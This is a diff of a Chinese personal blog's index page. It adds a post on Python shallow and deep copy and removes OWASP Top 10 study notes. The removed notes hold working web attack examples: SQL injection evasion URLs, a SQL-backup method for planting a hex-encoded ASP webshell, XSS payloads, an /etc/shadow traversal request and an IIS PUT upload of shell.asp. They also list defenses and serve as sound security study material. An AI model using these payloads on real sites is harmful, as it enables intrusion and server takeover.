@@ -190,6 +190,132 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2019/08/25/python——浅拷贝和深拷贝/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="AnchoretY">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AnchoretY's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/08/25/python——浅拷贝和深拷贝/" class="post-title-link" itemprop="url">python——浅拷贝和深拷贝</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-25 12:47:28" itemprop="dateCreated datePublished" datetime="2019-08-25T12:47:28+08:00">2019-08-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-01 17:37:43" itemprop="dateModified" datetime="2020-04-01T17:37:43+08:00">2020-04-01</time>
+              </span>
+
+          
+            <span id="/2019/08/25/python——浅拷贝和深拷贝/" class="post-meta-item leancloud_visitors" data-flag-title="python——浅拷贝和深拷贝" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/08/25/python——浅拷贝和深拷贝/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/08/25/python——浅拷贝和深拷贝/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>364</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​    要了解深拷贝和浅拷贝，首先要明确python中的可变类型和不可变类型。</p>
+<p><strong>不可变数据类型</strong></p>
+<blockquote>
+<ul>
+<li>Number（数字）</li>
+<li>String（字符串）</li>
+<li>Tuple（元组）</li>
+</ul>
+</blockquote>
+<p><strong>可变数据类型</strong></p>
+<blockquote>
+<ul>
+<li>List（列表）</li>
+<li>Dictionary（字典）</li>
+<li>Set（集合）</li>
+</ul>
+</blockquote>
+<h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>​    浅拷贝直接</p>
+<blockquote>
+<p>1.对于不可变类型 Number String Tuple,浅复制仅仅是地址指向，不会开辟新空间。</p>
+<p>2.对于可变类型 List、Dictionary、Set，浅复制会开辟新的空间地址(仅仅是最顶层开辟了新的空间，里层的元素地址还是一样的)，进行浅拷贝</p>
+<p>3.<strong>浅拷贝后，改变原始对象中为可变类型的元素的值，会同时影响拷贝对象的；改变原始对象中为不可变类型的元素的值，只有原始类型受影响。</strong></p>
+</blockquote>
+<h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><blockquote>
+<p>1.除了顶层拷贝，还对子元素也进行了拷贝</p>
+<p>2.经过深拷贝后，原始对象和拷贝对象所有的元素地址都没有相同的了</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2019/08/23/sql常见面试题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1549,309 +1675,11 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://anchorety.github.io/2019/07/26/OWASP-TOP10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="AnchoretY">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="AnchoretY's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/07/26/OWASP-TOP10/" class="post-title-link" itemprop="url">OWASP_TOP10</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-07-26 09:05:57" itemprop="dateCreated datePublished" datetime="2019-07-26T09:05:57+08:00">2019-07-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-24 12:48:58" itemprop="dateModified" datetime="2020-03-24T12:48:58+08:00">2020-03-24</time>
-              </span>
-
-          
-            <span id="/2019/07/26/OWASP-TOP10/" class="post-meta-item leancloud_visitors" data-flag-title="OWASP_TOP10" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/07/26/OWASP-TOP10/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/07/26/OWASP-TOP10/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    OWASP全称Open Web Application Security Project，即开源应用程序安全项目。OWASP TOP为该项目每年发布的最具权威的就是其”十大安全漏洞列表”。</p>
-<h3 id="1-注入"><a href="#1-注入" class="headerlink" title="1.注入"></a>1.注入</h3><p>​    sql注入等</p>
-<p>​    <strong>危害：</strong>导致数据丢失或数据破坏</p>
-<p><strong>常见混淆方式：</strong></p>
-<blockquote>
-<p>1.使用注释来进行截断</p>
-<p><a href="http://victim.com/news.php?id+un/**/ion+se/**/lect+1,2,3" target="_blank" rel="noopener">http://victim.com/news.php?id+un/*<em>//ion+se/*</em>/lect+1,2,3</a>—</p>
-<p>2.变换大小写</p>
-<p><a href="http://victim.com/news.php?id=1+UnIoN" target="_blank" rel="noopener">http://victim.com/news.php?id=1+UnIoN</a> SeLecT 1,2,3—</p>
-<p>3.替换关键词(将关键词插在关键词中)</p>
-<p><a href="http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--" target="_blank" rel="noopener">http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--</a></p>
-</blockquote>
-<p><strong>解决方法</strong>：</p>
-<blockquote>
-<p><strong>1.最佳方法：采用sql语句预编译和绑定变量</strong></p>
-<p>​    采用了PreparedStatement，就会将sql语句：”select id, no from user where id=?” <strong>预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了</strong>，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，<strong>那么后面输入的参数，是绝对不可能作为sql命令来执行的，**</strong>只会被当做字符串字面值参数**。所以sql语句预编译可以防御sql注入。</p>
-<p>2.一些特殊情况不能sql语句预编译的，可以<strong>进行严格的输入检查，限制输入数据类型、过滤关键字、使用正则表达式限制等</strong></p>
-</blockquote>
-<p><strong>sql注入方式写入webshell：</strong></p>
-<blockquote>
-<p>用工具对目标站直接写入一句话<strong>条件</strong>:root权限以及绝对路径</p>
-<p>方式：</p>
-<p>​    1.</p>
-<p>​        (1)创建自己的数据库  <a href="http://www.aspx-sqli.com/index.asp?id=1;create database zhong" target="_blank" rel="noopener">http://www.aspx-sqli.com/index.asp?id=1;create%20database%20zhong</a>;</p>
-<p>​        (2)先进行一次完整备份： ?id=1;backup database zhong to disk = ‘E:\wwwroot\asp_sqli’;</p>
-<p>​        (3)创建新表：在数据库名为中的库里面创建一个新的cmd表 create table [dbo].[zhong] ([cmd] [image]);</p>
-<p>​        (4)向cmd表中插入数据 ?id=1;insert into zhong(cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E);</p>
-<p>​        (5)进行数据库的差异备份  ?id=1;backup database zhong to disk=’E:\wwwroot\asp_sqli\zhongqzi.asp’ WITH DIFFERENTIAL,FORMAT;</p>
-<p>​        (6)菜刀连接</p>
-</blockquote>
-<h3 id="2-跨站脚本攻击"><a href="#2-跨站脚本攻击" class="headerlink" title="2.跨站脚本攻击"></a>2.跨站脚本攻击</h3><p>​    当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当的验证或转义就会导致快粘脚本漏洞。</p>
-<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><blockquote>
-<p><strong>1.反射性xss</strong></p>
-<p>​    又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p>
-<p>​    例：</p>
-<p>正常发送消息：</p>
-<p>​    <a href="http://www.test.com/message.php?send=Hello,World！" target="_blank" rel="noopener">http://www.test.com/message.php?send=Hello,World！</a></p>
-<p>接收者将会接收信息并显示Hello,Word</p>
-<p>非正常发送消息：</p>
-<p>​    <a href="http://www.test.com/message.php?send=" target="_blank" rel="noopener">http://www.test.com/message.php?send=</a><script>alert(‘foolish!’)</script>！</p>
-<p>接收者接收消息显示的时候将会弹出警告窗口</p>
-<p><strong>2.存储型xss</strong></p>
-<p>​    又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。</p>
-<p>​    例：</p>
-<p>留言板表单中的表单域：<input type="text" name="content" value="这里是用户填写的数据"></p>
-<p>正常操作：</p>
-<p>​    用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。</p>
-<p>非正常操作：</p>
-<p>​    攻击者在value填写<script>alert(‘foolish!’)</script>或者html其他标签（破坏样式。。。）、一段攻击型代码】；</p>
-<p>将数据存储到数据库中；</p>
-<p>​    其他用户取出数据显示的时候，将会执行这些攻击性代码</p>
-<p><strong>3.DOM型xss</strong></p>
-<p>​    当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。</p>
-<p>　　通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p>
-<p>　　前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。</p>
-<p>例：</p>
-<p>欢迎页面中name是截取URL中get过来的name参数</p>
-<p><strong>正常操作：</strong></p>
-<p><a href="http://www.vulnerable.site/welcome.html?name=Joe" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=Joe</a></p>
-<p><strong>非正常操作：</strong></p>
-<p><a href="http://www.vulnerable.site/welcome.html?name=" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=</a><script>alert(document.cookie)</script></p>
-</blockquote>
-<p><strong>危害：攻击者能够在受害者浏览器中执行脚本以及劫持用户会话、迫害网站、插入恶意内容等</strong></p>
-<h5 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.将重要的cookie设置为http only(这样Javascript 中的document.cookie语句就不能获取到cookie了)</p>
-<p>3.过滤或移除特殊的Html标签， 例如: <script>, <iframe> , &lt; for &lt;, &gt; for &gt;</p>
-<p>3.过滤JavaScript 事件的标签。例如 “onclick=”, “onfocus” 等等</p>
-</blockquote>
-<p><strong>xss经常利用的部分分别在哪里进行解码</strong></p>
-<blockquote>
-<p>HTML解释器：html对标记之间的内容   实体字符解码</p>
-<p>js解释器：javascript:标记后面的内容   unicode解码</p>
-<p>url解释器：要填入url的位置，都会交给url解释器进行解释   url解码</p>
-</blockquote>
-<p><strong>常见混淆：</strong></p>
-<blockquote>
-<p><strong>1.在属性值得部分进行字符串编码(标签和属性名不能进行编码)</strong></p>
-<p>​    例如：</p>
-<p><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></a></p>
-<p>​    被解释后为<a href="javascript:alert(1)"></a>,可以弹窗。</p>
-<p>​    利用点：当浏览器接受到一份HTML代码后，<strong>HTML解释器</strong>会对标签之间（<p>xxx</p>等，<script>除外)、标签的属性中（<a href='xxxx'>）进行实体字符解码变为相应的字符。</p>
-<p><strong>2.对于需要进行填入url的部分使用url进行编码(标签和属性名不能进行编码)</strong></p>
-<p>例如：</p>
-<p>​    <a href="javascript:%61%6c%65%72%74%28%31%29"></a>(注意这里的javascript:不能被编码)</p>
-<p>​    被url解释器解释完后为<a href="javascript:alert(1)"></a>，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</p>
-<p>​    利用点：利用<strong>url解释器</strong>对提交url的位置进行url解码</p>
-<p>3.当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。</p>
-<p>例如：</p>
-<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
-
-</p><p>​    解码后为<script>alert(1)</script>,一样可以弹窗</p>
-<p>利用点:当<strong>js解释器</strong>在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效</p>
-</blockquote>
-<p><strong>为什么常常将DOM型xss单独列出？DOM型xss和其他两种有什么区别？</strong></p>
-<blockquote>
-<p>因为DOM型主要是由于浏览器解析机制导致的，不需要服务器进行参与，而剩余两种都是需要服务器响应参与</p>
-</blockquote>
-<p><strong>设置了cookie 为http only，xss还有什么方法可以获取到cookie？</strong></p>
-<blockquote>
-<p>1.php类型的网站可以用phpinfo()</p>
-<p>2.</p>
-</blockquote>
-<h4 id="3-跨站请求伪造-CSRF"><a href="#3-跨站请求伪造-CSRF" class="headerlink" title="3.跨站请求伪造(CSRF)"></a>3.跨站请求伪造(CSRF)</h4><p>​    CSRF，全称为Cross-Site Request Forgery，跨站请求伪造，是一种网络攻击方式，它可以<strong>在用户毫不知情的情况下，以用户的名义伪造请求发送给被攻击站点</strong>，<strong>从而在未授权的情况下进行权限保护内的操作</strong>。具体来讲，可以这样理解CSRF。<strong>攻击者借用用户的名义，向某一服务器发送恶意请求，对服务器来讲，这一请求是完全合法的</strong>，但攻击者确完成了一个恶意操作，比如以用户的名义发送邮件，盗取账号，购买商品等等。</p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><blockquote>
-<p>Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
-<p>​    用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；并且，此后从用户浏览器发送请求给网站A时都会默认带上用户的Cookie信息；<br>　　<br>​    用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； </p>
-<p>​    浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行</p>
-</blockquote>
-<h5 id="CSRF必须步骤"><a href="#CSRF必须步骤" class="headerlink" title="CSRF必须步骤"></a>CSRF必须步骤</h5><blockquote>
-<p>1.用户访问可信任的网站并产生了cookie</p>
-<p>2.用户在访问A站点时没有退出，同时访问了恶意站点B</p>
-</blockquote>
-<h5 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.给每一个HTTP添加一个不可预测的令牌，并保证该令牌对每个用户会话来说是唯一的，并且不再URL中进行显示</p>
-<p>2.验证HTTP referer字段</p>
-</blockquote>
-<h5 id="XSS和CSRF的区别"><a href="#XSS和CSRF的区别" class="headerlink" title="XSS和CSRF的区别"></a>XSS和CSRF的区别</h5><blockquote>
-<p>1.能否cookie获取：</p>
-<p>​    CSRF无法获取用户的cookie，只是诱导受害者使用被服务器信任的cookie取执行攻击者构造好的请求</p>
-<p>​    XSS可以获取cookie</p>
-<p>2.漏洞利用前提</p>
-<p>​    CSRF攻击需要用户已经对登陆了目标网站</p>
-<p>​    XSS不需要用户已经登陆了目标网站</p>
-<p>3.原理区别</p>
-<p>​    CSRF是利用网站本身的api去进行攻击</p>
-<p>​    XSS是向网站中获请求中嵌入js代码，通过执行js进行攻击</p>
-</blockquote>
-<h3 id="4-其他安全问题"><a href="#4-其他安全问题" class="headerlink" title="4.其他安全问题"></a>4.其他安全问题</h3><p>waf和ips的绕过区别和一些技巧</p>
-<h4 id="2-失效的身份认证和会话管理"><a href="#2-失效的身份认证和会话管理" class="headerlink" title="2.失效的身份认证和会话管理"></a>2.失效的身份认证和会话管理</h4><p>​    <strong>身份认证</strong>：身份认证最常用于系统登录，形式一般为用户名和密码登录方式，在安全性要求较高的情况下，还有验证码、客户端证书、Ukey等</p>
-<p>​    <strong>会话管理</strong>：<em>HTTP</em>利用会话机制来实现身份认证，<em>HTTP</em>身份认证的结果往往是获得一个令牌并放在<em>cookie</em>中，之后的身份识别只需读授权令牌，而无需再次进行登录认证</p>
-<p><strong>攻击原理</strong></p>
-<blockquote>
-<p>开发者通常会建立自定义的认证和会话管理方案。但与身份认证和回话管理相关的应用程序功能往往得不到正确的实现，要正确实现这些方案却很难，结果<strong>在退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞</strong>，这就导致了攻击者攻击者<strong>破坏密码、密钥、会话令牌或攻击其他的漏洞</strong>去<strong>冒充其他用户</strong>的身份（暂时或永久的）</p>
-</blockquote>
-<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><blockquote>
-<p>1.用户的身份认凭证(url中的id、cookie等)没有使用哈希或加密保护</p>
-<p>2.会话ID暴露在URL里</p>
-<p>3.会话ID没有超时限制，或超时限制不合理</p>
-<p>4.认证凭证存在规律，可以直接通过猜测获得</p>
-</blockquote>
-<p><img src="/Users/yhk/Library/Application Support/typora-user-images/image-20190726091123531.png" alt="image-20190726091123531"></p>
-<h5 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.cookie和url中的身份凭证进行加密</p>
-<p>2.设置密码和会话的有效期，并强制使用强密码</p>
-<p>3.账号密码以密文形式传输在数据中hash存储</p>
-</blockquote>
-<h4 id="4-不安全对象的直接引用"><a href="#4-不安全对象的直接引用" class="headerlink" title="4.不安全对象的直接引用"></a>4.不安全对象的直接引用</h4><p>​    不安全的直接对象引用，也被称IDOR。IDOR允许攻击者<strong>绕过网站的身份验证机制，并通过修改指向对象链接中的参数值来直接访问目标对象资源</strong>，这类资源可以是属于其他用户的数据库条目以及服务器系统中的隐私文件等等。</p>
-<h5 id="常见攻击形式："><a href="#常见攻击形式：" class="headerlink" title="常见攻击形式："></a>常见攻击形式：</h5><blockquote>
-<p> <strong>目录遍历</strong></p>
-<p>​    假设 Web 应用程序允许为要呈现给用户存储在本地计算机上的文件。如果应用程序不验证应访问哪些文件，攻击者可以请求其他文件系统上的文件和那些也会显示。</p>
-<p>例如，如果攻击者通知 URL:<br>    <a href="https://oneasp.com/file.jsp?file=report.txt" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=report.txt</a></p>
-<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br>    <a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow**" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=**../../../etc/shadow**</a></p>
-<p>这样 /etc/阴影文件返回并且呈现由 file.jsp 演示页面容易受到目录遍历攻击。</p>
-<p><strong>开方重定向</strong></p>
-<p>​     Web 应用程序有一个参数，允许其他地方的用户重定向到网站。如果此参数不实现正确使用白名单，攻击者可使用这一网络钓鱼攻击引诱到他们选择的站点的潜在受害者。</p>
-</blockquote>
-<p>例：</p>
-<p>例如，如果攻击者通知 URL:<br><a href="https://oneasp.com/file.jsp?file=report.txt" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=report.txt</a></p>
-<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br><a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow**" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=**../../../etc/shadow**</a></p>
-<h5 id="防范："><a href="#防范：" class="headerlink" title="防范："></a>防范：</h5><blockquote>
-<p>1.验证用户输入的url请求，拒绝包含../和./的请求</p>
-<p>2.锁定服务器上的</p>
-</blockquote>
-<h4 id="5-安全配置错误"><a href="#5-安全配置错误" class="headerlink" title="5.安全配置错误"></a>5.安全配置错误</h4><p>​    良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。</p>
-<h5 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例"></a>攻击案例</h5><blockquote>
-<p>案例#1：应用程序服务器管理员控制台自动安装后没有被删除。而默认帐户也没有被改变。攻击者在你的服务器上发现了标准的</p>
-<p>管理员页面，通过默认密码登录，从而接管了你的服务器。<br>案例#2：目录列表在你的服务器上未被禁用。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到并下载所有已编译的Java类，她通过反编译获得了所有你的自定义代码。然后，她在你的应用程序中找到一个访问控制的严重漏洞。<br>案例三：</p>
-<p>1）打开IISPutScanner.exe应用扫描服务器,输入startIP192.168.1.119和endIP192.168.1.119(也可以对 一个网段进行设置) ,点击Scan</p>
-<p>进行扫描,PUT为YES服务器类型为IIS ,说明可能存在IIS写权限漏洞。</p>
-<p><img src="https://images2015.cnblogs.com/blog/1076111/201701/1076111-20170121133837078-989051273.png" alt="img"></p>
-<p>（2）使用iiswrite.exe应用,使用此软件来利用IIS写权限漏洞上传一句话木马。</p>
-<p>1.以PUT方式上传22.txt文件。检查目标网站是否有test.txt文件显示出错,说明没有 test.txt文件,那么我们可以请求的文件名可以为22.txt。域名为192.168.1.119,点击提交 数据包。重新访问 192.168.1.119/test.txt显示上传内容,说明上传成功。</p>
-<p>2.使用COPY方式复制一份数据,数据的文件名为shell.asp,点击提交数据。使用浏览 器访问<a href="http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。" target="_blank" rel="noopener">http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。</a></p>
-<p>3.打开中国菜刀,鼠标右键点击添加输入地址<a href="http://192.168.1.119/shell.asp密码为chop" target="_blank" rel="noopener">http://192.168.1.119/shell.asp密码为chop</a> per点击添加。双击打开连接,获取到服务器的目录,看到有上传的shell.asp文件 和 test.txt文件。</p>
-</blockquote>
-<h5 id="防范-3"><a href="#防范-3" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.了解并及时部署每个环境的软件更新和补丁信息</p>
-<p>2.统一出错处理机制，错误处理会向用户显示堆栈跟踪获其他归于丰富的错误消息信息。</p>
-<p>3.使用提供有效分离和安全性强大的应用程序架构</p>
-</blockquote>
-<h4 id="6-敏感信息泄露"><a href="#6-敏感信息泄露" class="headerlink" title="6.敏感信息泄露"></a>6.敏感信息泄露</h4><p>​    常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。</p>
-<h5 id="敏感数据包括哪些？"><a href="#敏感数据包括哪些？" class="headerlink" title="敏感数据包括哪些？"></a>敏感数据包括哪些？</h5><blockquote>
-<p>1.个人信息</p>
-<p>2.网站登录用户名、密码、SSL证书、会话ID、加密使用的秘钥等</p>
-<p>3.Web服务器的系统类型、版本、Web服务器信息、数据库信息等</p>
-</blockquote>
-<h5 id="防范-4"><a href="#防范-4" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.个人信息数据加密存储</p>
-<p>2.敏感数据的传输使用SSL加密传输</p>
-<p>3.应用程序出错的信息不直接显示在页面上，统一错误页面</p>
-</blockquote>
-<h4 id="7-缺少功能级的访问控制"><a href="#7-缺少功能级的访问控制" class="headerlink" title="7.缺少功能级的访问控制"></a>7.缺少功能级的访问控制</h4><p>​    功能级的保护是通过系统配置管理的，当系统配置错误时，开发人员必须做相应的代码检查，否则应用程序不能正确的保护页面请求。攻击者就是利用这种漏洞访问未经授权的功能模块。</p>
-<p>​    很多系统的<strong>权限控制是通过页面灰化或隐藏URL实现的</strong>，<strong>没有在服务器端进行身份确认和权限验证</strong>，导致攻击者通过修改页面样式或获取隐藏URL，进而获取特权页面来对系统进行攻击，或者在匿名状态下对他人的页面进行攻击，从而获取用户数据或提升权限。</p>
-<p>​    此类问题<strong>主要是系统在开发或者设计阶段，没有考虑攻击场景，以为看不到就是安全的</strong>，这种系统说白了是服务端没有进行权限控制和身份校验，才给了攻击者可乘之机。</p>
-<h5 id="防范-5"><a href="#防范-5" class="headerlink" title="防范"></a>防范</h5><blockquote>
-<p>1.设置严格的权限控制系统，尤其是<strong>服务端</strong>必须进行权限和身份验证</p>
-<p>2.默认缺省情况下，应该拒绝所有访问的执行权限</p>
-<p>3.对于每个功能的访问，都要有明确的角色授权，采用过滤器的方式校验每个请求的合法性</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1919,7 +1747,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
